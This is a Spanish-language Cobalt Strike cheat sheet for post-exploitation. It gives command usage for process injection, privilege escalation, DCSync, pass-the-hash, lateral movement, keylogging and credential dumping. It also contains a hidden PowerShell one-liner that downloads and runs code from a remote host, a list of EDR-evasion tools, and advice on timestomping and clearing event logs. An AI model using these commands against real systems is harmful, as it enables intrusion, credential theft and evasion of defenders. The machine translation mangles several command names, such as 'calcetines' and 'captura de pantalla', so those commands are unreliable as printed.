Hoja de referencia de Cobalt Strike

Notas generales y consejos para la estructura Cobalt Strike C2.

## Resumen

- [Hoja de trucos de Cobalt Strike](#cobalt-strike-notes)
- [Resumen](#summary)
- [Explicación básica del menú](#basic-menu-explanation)
- [Escuchadores](#listeners)
- [Perfiles C2 maleables](#malleable-c2-profiles)
- [Scripts del agresor](#aggressor-scripts)
- [Comandos comunes](#common-commands)
- [Explotación](#exploitation)
- [Escalada de privilegios](#privilege-escalation)
- [Pivote](#pivoting)
- [Movimiento lateral](#lateral-movement)
- [Exfiltración](#exfiltración)
- [Miscelánea](#miscellaneous)
- [OPSEC Notas](#opsec-notes)

## Explicación del menú básico

- **Cobalt Strike:** Este menú, el más básico, contiene las funciones para conectarse a un servidor de equipo, configurar las preferencias, cambiar la vista de las sesiones de beacon, administrar los oyentes y los scripts de agresor.
- **Vista:** Este menú consta de elementos que gestionan objetivos, registros, credenciales recopiladas, capturas de pantalla, pulsaciones de teclas, etc. Su objetivo principal es facilitar el acceso a la salida de varios módulos, administrar el botín y los objetivos del dominio.
- **Ataques:** Este menú contiene numerosos métodos de generación de ataques del lado del cliente, como correos de phishing, clonación de sitios web y alojamiento de archivos. También ofrece diversas maneras de generar las cargas útiles de beacon o simplemente generar código shell y guardarlo para su uso posterior en otra herramienta de ofuscación. - **Informes:** Proporciona una forma sencilla de generar archivos PDF u hojas de cálculo con información sobre la ejecución de un ataque. De esta forma, facilita la organización de informes breves, simplificando el proceso de redacción del informe final.
- **Ayuda:** Menú de ayuda básica de la herramienta.

## Escuchadores

### Escuchadores de salida

- **HTTP/HTTPS:** Las cargas útiles más básicas para beacon. Por defecto, los escuchadores escuchan en los puertos 80 y 443, con la opción de configurar puertos personalizados. Puede configurar el proxy, personalizar la cabecera HTTP o especificar un puerto de enlace para redirigir el tráfico de beacon si la infraestructura utiliza servidores redirectores para las devoluciones de llamada de la carga útil.
- **DNS:** Una opción de carga útil muy sigilosa que proporciona tráfico sigiloso a través del protocolo DNS. Debe especificar el servidor DNS al que conectarse. La mejor situación para usar este tipo de escucha es en un entorno muy restringido que bloquea incluso el tráfico común, como los puertos 80 y 443.

### Escuchas Pivot

- **TCP:** Un escucha TCP básico que se enlaza a un puerto específico.
- **SMB:** Una opción excelente para la propagación interna y el movimiento lateral. Esta carga utiliza canalizaciones con nombre sobre el protocolo SMB y es la mejor manera de eludir los firewalls cuando incluso los puertos predeterminados, como el 80 y el 443, están en la lista negra.

### Escuchas Diversas

- **HTTP/HTTPS Externo:** Este tipo de escucha nos permite transferir una sesión del framework de Metasploit a Cobalt Strike utilizando cargas útiles http o https. Un ejemplo útil es ejecutar un módulo de exploit desde Metasploit y obtener una sesión de baliza en Cobalt Strike. **C2 Externo:** Este es un tipo especial de receptor que permite a las aplicaciones de terceros actuar como medio de comunicación para la baliza.

## Perfiles C2 Maleables
En pocas palabras, un perfil C2 maleable es un archivo de configuración que define cómo se comunicará y se comportará la baliza al ejecutar módulos, generar procesos e hilos, inyectar DLL o acceder al disco y la memoria. Además, configura cómo se verá el tráfico de la carga útil en un PCAP, el intervalo de comunicación y el jitter, etc.

La gran ventaja de los perfiles C2 maleables personalizados es que podemos configurar y personalizar nuestra carga útil para que se adapte a nuestra situación y al entorno objetivo. De esta forma, nos volvemos más sigilosos al integrarnos con el tráfico del entorno.

## Scripts de Aggressor
Aggressor Script es el lenguaje de scripting integrado en Cobalt Strike, versión 3.0 y posteriores. Aggressor Script permite modificar y ampliar el cliente de Cobalt Strike. Estos scripts pueden añadir funciones adicionales a módulos existentes o crear nuevos.

[Tutorial del script de Aggressor](https://download.cobaltstrike.com/aggressor-script/index.html)

## Comandos comunes
- **help:** Lista de los comandos disponibles.
- **help \<module>:** Muestra el menú de ayuda del módulo seleccionado.
- **jobs:** Lista los trabajos en ejecución de Beacon.
- **jobkill \<id>:** Finaliza el trabajo seleccionado.
- **run:** Ejecuta comandos del sistema operativo mediante llamadas a la API de Win32.
- **shell:** Ejecuta comandos del sistema operativo generando "cmd.exe /c".
- **powershell:** Ejecuta comandos generando "powershell.exe".
- **powershell-import:** Importa un módulo local de PowerShell en el proceso Beacon actual. - **powerpick:** Ejecuta comandos de PowerShell sin generar "powershell.exe", utilizando únicamente bibliotecas y ensamblados .NET. (Omite AMSI y CLM).
- **drives:** Lista las unidades del sistema actuales.
- **getuid:** Obtiene el UID del usuario actual.
- **sleep:** Establece el intervalo y la fluctuación de la devolución de llamada de la baliza.
- **sleep Uso:**
```
sleep [tiempo en segundos] [fluctuación]
```
i.e.
```
sleep 5 60
sleep 120 40
...
```
- **ps:** Listado de procesos.
- **cd:** Cambiar directorio.
- **cp:** Copiar un archivo local a otra ubicación local.
- **download/upload:** Descargar y subir un archivo local.
- **download/upload Uso:**
```
download C:\Users\victim\Documents\passwords.csv
upload C:\Users\S1ckB0y1337\NotMalware\youvebeenhacked.txt
```
- **cancel:** Cancelar la descarga de un archivo.
- **reg:** Consultar el Registro.

## Explotación
- **browserpivot:** Secuestrará una sesión web de Internet Explorer y nos permitirá navegar por la web como el navegador de la víctima, incluyendo sus sesiones, cookies y contraseñas guardadas. - **dcsync:** Realiza el ataque DCsync usando mimikatz.
- **dcsync Uso:**
```
dcsync [DOMINIO.fqdn] [DOMINIO\usuario]
```
p. ej.
```
dcsync CORP.local CORP\steve.johnson
```
- **desktop:** Inyecta un servidor VNC en el proceso de baliza y obtiene una vista remota del escritorio del objetivo.
- **desktop Uso:**
```
desktop [pid] [x86|x64] [high|low]
```
p. ej.
```
desktop 592 x64 high
desktop 8841 x86 low
```
:exclamation: Los argumentos high/low especifican la calidad de la sesión.
- **dllinject/dllload:** Inyecta una DLL reflexiva en un proceso/Carga una DLL en el proceso actual. - **execute-assembly:** Carga y ejecuta un ensamblado compilado de .NET completamente en memoria.
- **execute-assembly Uso:**
```
execute-assembly [/path/to/local/.NET] [arguments]
```
- **inject:** Inyecta una carga útil de baliza en un proceso específico y genera una nueva sesión de baliza bajo su contexto de seguridad.
- **inject Uso:**
```
inject [pid] [x86|x64] [listener]
```
p. ej.
```
inject 9942 x64 Lab-SMB
inject 429 x86 Lab-HTTPS
...
```
- **kerberos\*:** Manipula tickets de Kerberos.
- **ppid:** Falsifica el proceso padre de la baliza para cualquier trabajo secundario que genere una tarea posterior a la explotación. De esta forma, podemos ocultar nuestros trabajos maliciosos posteriores a la explotación.
- **psinject:** Inyectar en un proceso específico y ejecutar un comando usando la funcionalidad de PowerPick. \
:notebook: Los módulos de PowerShell importados con **powershell-import** están disponibles.
- **runu:** Ejecutar un comando bajo un PID de proceso falsificado.
- **shinject:** Inyectar shellcode en otro proceso en ejecución.
- **shspawn:** Crear un nuevo proceso e inyectar shellcode en él.
- **shspawn Uso:**
```
shspawn [x86|x64] [/path/to/my.bin]
```
p. ej.
```
shspawn x64 /opt/shellcode/malicious.bin
```

## Escalada de privilegios
- **elevate:** Contiene numerosas maneras de escalar tus privilegios a Administrador o SISTEMA usando exploits del kernel y omisiones del UAC. - **Uso de elevate:**
```
elevate [exploit] [listener]
```
p. ej.
```
elevate juicepotato Lab-SMB
elevate ms16-032 Lab-HTTPS
...
```
- **getsystem:** Intenta suplantar la identidad del sistema. Si falla, podemos usar steal_token para robar un token de un proceso que se ejecuta como SYSTEM.
- **getprivs:** Igual que la función de metasploit, habilita todos los privilegios disponibles en el token actual.
- **runasadmin:** Intenta ejecutar un comando en un contexto elevado de Administrador o SYSTEM utilizando un kernel local o un exploit para omitir el UAC. La diferencia con elevate es que no genera una nueva baliza, sino que ejecuta una aplicación específica de nuestra elección en el nuevo contexto. - **Uso de runasadmin:**
```
runasadmin [exploit] [comando] [argumentos]
```
p. ej.

```
runasadmin uac-token-duplication [comando]
runasadmin uac-cmstplua [comando]
```
## Pivotación
- **socks:** Inicia un servidor proxy Socks4a y escucha en un puerto específico. Se puede acceder a través del servidor proxy usando un cliente proxy como ProxyChains o RedSocks.
- **Uso de calcetines:**
```
socks [puerto]
```
p. ej.
```
socks 9050
```
:exclamation: Esto requiere que su archivo /etc/proxychains.conf esté configurado para coincidir con el puerto especificado. Si opera en Windows, su archivo proxychains.conf puede estar ubicado en %USERPROFILE%\.proxychains\proxychains.conf, (SYSCONFDIR)/proxychains.conf o (Global programdata dir)\Proxychains\proxychains.conf.
- **covertvpn:** Implementa una VPN en el sistema actual, crea una nueva interfaz y la fusiona con una IP específica. Con esto, podemos usar una interfaz local para acceder a la red de destino interna como si tuviéramos una conexión real a través de un enrutador.

## Movimiento lateral
- **portscan:** Realiza un escaneo de puertos en un objetivo específico. - **Uso de portscan:**
```
portscan [IP o rango de IP] [puertos]
```
p. ej.
```
portscan 172.16.48.0/24 1-2048,3000,8080
```
El comando anterior escaneará toda la subred 172.16.48.0/24 en los puertos 1 a 2048, 3000 y 8080. También se puede utilizar para IP individuales.
- **runas:** Un contenedor de runas.exe. Con las credenciales, puede ejecutar un comando como otro usuario.
- **runas:**
```
runas [DOMINIO\usuario] [contraseña] [comando] [argumentos]
```
p. ej.
```
runas CORP\Administrador securePassword12! Powershell.exe -nop -w hidden -c "IEX ((nuevo-objeto net.webclient).downloadstring('http://192.168.50.90:80/filename'))"
```
- **pth:** Al proporcionar un nombre de usuario y un hash NTLM, puede realizar un ataque Pass The Hash e inyectar un TGT en el proceso actual. \
:exclamation: Este módulo requiere privilegios de administrador.
- **pth Uso:**
```
pth [DOMINIO\usuario] [hash]
```
```
pth Administrador 97fc053bc0b23588798277b22540c40d
pth CORP\Administrador 97fc053bc0b23588798277b22540c40d
```
- **steal_token:** Robar un token de un proceso específico.
- **make_token:** Al proporcionar credenciales, puede crear un token de suplantación en el proceso actual y ejecutar comandos. Desde el contexto del usuario suplantado.
- **jump:** Proporciona una forma fácil y rápida de moverse lateralmente usando winrm o psexec para generar una nueva sesión de baliza en un objetivo. \
:exclamation: El módulo **jump** usará el token de delegación/suplantación actual para autenticarse en el objetivo remoto. \
:muscle: Podemos combinar el módulo **jump** con el módulo **make_token** o **pth** para un "salto" rápido a otro objetivo en la red.
- **jump Uso:**
```
jump [psexec64,psexec,psexec_psh,winrm64,winrm] [servidor/estación de trabajo] [escuchador]
```
p. ej.
```
jump psexec64 DC01 Lab-HTTPS
jump winrm WS04 Lab-SMB
jump psexec_psh WS01 Lab-DNS
...
```
- **remote-exec:** Ejecuta un comando en un objetivo remoto usando psexec, winrm o wmi. \
:exclamation: El módulo **remote-exec** usará el token de delegación/suplantación actual para autenticarse en el objetivo remoto.
- **remote-exec Uso:**
```
remote-exec [método] [objetivo] [comando]
```
- **ssh/ssh-key:** Autentica usando SSH con contraseña o clave privada. Funciona tanto para hosts Linux como Windows. Ofrece funcionalidad básica de SSH con algunos módulos adicionales para la postexplotación.

## Exfiltración
- **hashdump:** Vuelca los hashes NTLM de la colmena SAM local. Esto solo vuelca las credenciales de usuario de la máquina local.
- **keylogger:** Captura las pulsaciones de teclas de un proceso específico y las guarda en una base de datos.
- **keylogger Uso:**
```
keylogger [pid] [x86|x64]
```
p. ej.
```
keylogger 8932 x64
keylogger
...
```
Este comando también se puede usar sin especificar argumentos para generar un proceso temporal e inyectarle el registrador de pulsaciones de teclas.
- **captura de pantalla:** Captura la pantalla de un proceso actual y la guarda en la base de datos.
- **uso de la captura de pantalla:**
```
captura de pantalla [pid] [x86|x64] [tiempo de ejecución en segundos]
```
p. ej.
```
captura de pantalla 1042 x64 15
captura de pantalla 773 x86 5
```
- **contraseña de inicio de sesión:** Ejecuta la conocida función **contraseñas de inicio de sesión** de mimikatz en la máquina actual. Esta función, por supuesto, utiliza la inyección de procesos, por lo que no es segura para OPSEC; úsela con precaución.
- **mimikatz:** Puede ejecutar cualquier función de mimikatz. La funcionalidad del controlador mimikatz no está incluida.

## Varios
- **spawn:** Genera una nueva baliza en la máquina actual. Puede elegir el tipo de oyente que desee.
- **spawn Uso:**
```
spawn [x86|x64] [oyente]
```
p. ej.
```
spawn x64 Lab-HTTPS
spawn x86 Lab-SMB
...
```
- **spawnas:** Genera una nueva baliza en la máquina actual como otro usuario proporcionando credenciales.
- **spawnas Uso:**
```
spawnas [DOMINIO\usuario] [contraseña] [oyente]
```
p. ej.
```
spawnas CORP\bob.smith baseBall1942 Lab-SMB
spawnas Administrador SuperS3cRetPaSsw0rD Lab-HTTPS
...
```
- **spawnto:** Establece Ejecutable que Beacon usará para generar e inyectar shellcode para su funcionalidad posterior a la explotación. Debe especificar la ruta completa del ejecutable.
```
spawnto [x86|x64] [c:\path\to\whatever.exe]
```
p. ej.
```
spawnto x64 c:\programdata\beacon.exe
spawnto x86 c:\users\S1ckB0y1337\NotMalware\s1ck.exe
```
- **spawnu:** Si se intenta generar una sesión con un PID de suplantación como padre, el contexto del proceso coincidirá con la identidad del PID especificado.
```
spawnu [pid] [listener]
```
p. ej.
```
spawnu 812 Lab-SMB
spawnu 9531 Lab-DNS
...
```
- **argumento:** Enmascarará/falsificará los argumentos de un comando malicioso de nuestra elección con argumentos legítimos.
- **blockdlls:** Este módulo creará y establecerá una política personalizada en los procesos secundarios de Beacon que bloqueará la inyección de cualquier DLL de terceros que no esté firmada por Microsoft. De esta forma, podemos bloquear cualquier herramienta del equipo azul que utilice la inyección de DLL para inspeccionar y eliminar procesos y acciones maliciosas.
- **blockdlls Uso:**
```
blockdlls [inicio|detención]
```
- **timestomp:** Alterar la marca de tiempo de un archivo aplicando la marca de tiempo de otro.
- **timestomp Uso:**
```
timestomp [archivoA] [archivoB]
```
Por ejemplo:
```
timestomp C:\Users\S1ckB0y1337\Desktop\logins.xlsx C:\Users\S1ckB0y1337\Desktop\notmalicious.xlsx
```
## Notas de OPSEC
- **Preparación de la sesión:** Antes de realizar cualquier acción posterior a la explotación tras haber comprometido un host, debemos preparar nuestra baliza para que coincida con el comportamiento del entorno. De esta manera, generaremos menos amenazas.

Podemos usar la cantidad de IOC (Indicadores de Compromiso). Para ello, podemos usar el módulo "spawnto" para especificar qué binario usarán nuestros procesos secundarios para ejecutar acciones posteriores a la explotación. También podemos usar el módulo "ppid" para suplantar el proceso principal bajo el cual se generarán nuestros procesos secundarios. Ambos trucos nos proporcionarán un alto grado de sigilo y ocultarán nuestra presencia en el host comprometido.
- **Combinación del Comportamiento del Entorno:** En un contexto posterior a la explotación, incluso cuando usamos los protocolos http(s) para integrarnos con el tráfico del entorno, una buena solución de seguridad de endpoints o un firewall de última generación puede detectar que existe tráfico inusual en este entorno y probablemente lo bloqueará y generará telemetría a un endpoint SOC para que el equipo azul lo examine. Aquí es donde entran en juego los perfiles "Malleable C2". Se trata de un archivo de configuración que cada servidor del equipo Cobalt Strike puede usar y que proporciona personalización y flexibilidad para: tráfico de balizas, inyección de procesos, generación de procesos, comportamiento, evasión de antivirus, etc. Por lo tanto, la mejor práctica es nunca usar el comportamiento predeterminado de las balizas y siempre usar un perfil personalizado para cada evaluación.

## Herramientas y métodos de evasión de EDR
- [PEzor](https://github.com/phra/PEzor): Empaquetador de PE para evasión de EDR.
- [SharpBlock](https://github.com/CCob/SharpBlock): Un método para eludir las DLL de proyección activa de EDR, impidiendo la ejecución del punto de entrada.
- [TikiTorch](https://github.com/rasta-mouse/TikiTorch): Evasión de antivirus/EDR mediante inyección de vaciado de procesos. - [Donut](https://github.com/TheWover/donut): Donut es un código independiente de la posición que permite la ejecución en memoria de archivos VBScript, JScript, EXE, DLL y ensamblados .NET.
- [Dynamic-Invoke](https://thewover.github.io/Dynamic-Invoke/): Evita la solución EDR ocultando las llamadas maliciosas a la API de Win32 desde el código administrado de C#.

## CONSEJOS GENERALES PARA LA POSEXPLOTACIÓN
- Antes de ejecutar cualquier cosa, asegúrese de comprender su comportamiento y los IOC (Indicadores de Compromiso) que genera.
- Intente minimizar la interacción con el disco y opere principalmente en memoria.
- Revise las políticas de AppLocker para determinar qué tipos de archivos puede ejecutar y desde qué ubicaciones.
- Limpie los artefactos inmediatamente después de finalizar una tarea de posexplotación.
- Limpie los registros de eventos después de finalizar con un host.